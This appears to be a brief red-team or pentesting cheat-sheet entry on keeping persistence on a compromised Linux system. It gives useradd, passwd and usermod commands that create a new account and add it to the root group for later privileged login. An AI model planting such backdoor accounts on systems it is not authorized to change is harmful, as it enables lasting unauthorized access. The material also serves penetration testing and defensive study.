# Establishing Persistence by creating a New User

Another method of establishing persistence is by creating a new user and adding them to the ROOT group. <br><br>
By doing this, we can later login as this user with ROOT privileges and stay persistent in the network.

```
useradd -m "NEW USER" -s /bin/bash 
passwd "NEW USER"

#Add new user to ROOT group
usermod -aG root "NEW USER"
```
